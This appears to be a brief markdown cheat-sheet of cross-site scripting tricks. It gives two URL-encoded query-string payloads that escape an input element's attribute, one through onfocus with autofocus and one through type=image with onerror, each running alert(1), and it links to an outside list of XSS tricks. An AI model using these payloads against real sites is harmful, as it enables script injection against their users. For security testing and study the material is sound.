# XSS

## Legend

Symbol/Abbr. | Description
-------------|------------
✔ | Finished
❌ | Rejected / Not done
! | Important
X -> Y | X has resulted in Y
X &-> Y |X depends on Y

## XSS in `<input ../>` attribute

Use `onfocus` event with the `autofocus` HTML5 attribute:

    [path]?q=aaaaa%20onfocus%3Dalert%281%29%20autofocus%20     # aaaaa onfocus=alert(1) autofocus

---

Change the `<input .. />` type to `image` with adding `type=image` - [Input image type](http://html.com/input-type-image/):

    [path]?q=x%20src%3Dx%20onerror%3Dalert%281%29%20type%3Dimage    # x src=x onerror=alert(1) type=image


## References

URL | Description
----|------------
[HTML Purifier](http://htmlpurifier.org/live/smoketests/xssAttacks.php) | Very good reference for XSS tricks